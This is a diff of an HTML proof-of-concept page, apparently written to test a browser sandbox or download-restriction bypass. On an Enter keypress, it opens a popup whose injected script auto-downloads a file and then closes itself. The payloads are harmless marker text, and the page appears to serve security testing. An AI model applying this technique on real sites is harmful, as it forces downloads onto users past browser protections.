@@ -14,15 +14,26 @@
     <h3>Situs A (Origin 1)</h3>
     <button id="targetBtn">Click this button, then PRESS and HOLD "Enter"</button>
     <script>
-        document.getElementById('targetBtn').focus();
         document.addEventListener("keydown", (e) => {
             if (e.key === "Enter") {
-                const a = document.createElement("a");
-                a.href = "data:application/octet-stream;base64,UE9DIC0gU2FuZGJveCBCeXBhc3M=";
-                a.download = "exploit.txt";
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
+                console.log("Attempting Popup Escape...");
+                const popup = window.open("", "_blank", "width=200,height=200");
+                if (popup) {
+                    popup.document.write(`
+                <h1>Downloading...</h1>
+                <script>
+                    const a = document.createElement("a");
+                    a.href = "data:text/plain;base64,UE9DIC0gUG9wdXAgRXNjYXBl";
+                    a.download = "popup_bypass.txt";
+                    document.body.appendChild(a);
+                    a.click();
+                    // Tutup popup setelah download dipicu
+                    setTimeout(() => { window.close(); }, 1000);
+                <\/script>
+            `);
+                } else {
+                    console.error("Popup blocked! User gesture might be too weak or persistent.");
+                }
             }
         });
     </script>
